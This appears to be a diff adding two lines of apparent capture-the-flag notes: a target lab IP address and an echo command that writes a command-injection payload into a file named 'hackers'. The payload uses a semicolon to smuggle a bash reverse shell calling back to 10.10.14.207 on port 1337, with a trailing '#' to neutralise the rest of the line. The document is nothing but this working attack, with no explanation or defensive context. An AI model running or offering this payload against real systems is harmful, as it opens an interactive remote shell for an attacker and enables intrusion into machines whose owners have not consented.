@@ -1,0 +1,2 @@
+IP:10.10.10.226
+echo "  ;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.207/1337 0>&1' #" >> hackers
